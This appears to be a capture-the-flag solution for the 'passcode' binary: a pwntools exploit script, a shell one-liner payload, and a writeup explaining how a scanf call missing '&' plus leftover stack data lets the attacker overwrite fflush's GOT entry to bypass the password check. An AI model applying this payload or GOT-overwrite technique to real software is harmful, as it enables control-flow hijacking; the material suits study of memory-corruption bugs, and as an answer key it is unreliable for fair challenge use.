# RUN pwn template TO GET ORIGINAL TEMPLATE
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'passcode')

# Split terminal Vertically if we run with GDB
context.terminal = ['tmux', 'splitw', '-h']

# Attach GDB session
def start(argv=[], *a, **kw):
    return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)

gdbscript = '''
tbreak main
break *login+69
continue '''.format(**locals())

# EXPLOIT
p = start()
p.sendline( '\x01'*96 + '\x14\xc0\x04\x08' + '134517406' )
p.interactive()


"""
ONELINER
python3 -c "import sys; sys.stdout.buffer.write(b'\x41'*96 + b'\x14\xc0\x04\x08' + b'134517406\n')" | ./passcode
"""

"""
WRITEUP


The bug here is that scanf is not using the address of (&) operator on the second argument,
resulting in a seg fault when we enter numbers. scanf takes its arguments from the stack, with
the first argument being a poitner to the format string and the second being the address of where
the data will be stored.

There is another slight bug where when we write our name in welcome(), it is written to the stack.
welcome()'s stack is destroyed once it exits, and login() is called immediately after, meaning that
login()'s stack will lie where welcome()'s was. 

Turns out we can overwrite the second argument to the password1 scanf (since it is on the stack) and
have the write location of our input point to whatever we want.

To exploit this, we write to the global offset table ( use objdump -R <binary> or a symbol table )
for the entry for fflush.

The got stores the addresses of external functions that are referenced in the code, and is writable
since the dynamic linker must update the addresses of dynamic libraries.

So, we use the scanf vulnerability to write to fflush's entry in the GOT, and we write an addresses
that passes the input check and gets the flag. Once fflush is called again, it will resolve the address
in the GOT table (which we manipulated) and the flag will be provided.


"""
